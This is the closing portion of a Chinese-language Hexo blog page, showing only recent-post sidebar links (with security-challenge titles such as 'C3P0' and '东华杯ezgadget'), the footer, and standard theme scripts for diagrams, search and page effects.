src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-rrejgm_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Code-Breaking Puzzles"/></a><div class="content"><a class="title" href="/2023/10/20/Code-Breaking-Puzzles/" title="Code-Breaking Puzzles">Code-Breaking Puzzles</a><time datetime="2023-10-20T02:41:05.000Z" title="发表于 2023-10-20 10:41:05">2023-10-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-jxl31y_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="东华杯ezgadget"/></a><div class="content"><a class="title" href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget">东华杯ezgadget</a><time datetime="2023-10-19T08:02:57.000Z" title="发表于 2023-10-19 16:02:57">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/15/C3P0/" title="C3P0"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="C3P0"/></a><div class="content"><a class="title" href="/2023/09/15/C3P0/" title="C3P0">C3P0</a><time datetime="2023-09-15T06:40:10.000Z" title="发表于 2023-09-15 14:40:10">2023-09-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
+  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
+  mermaid.initialize(options);
+}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addModeChange('mermaid', runMermaid)
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
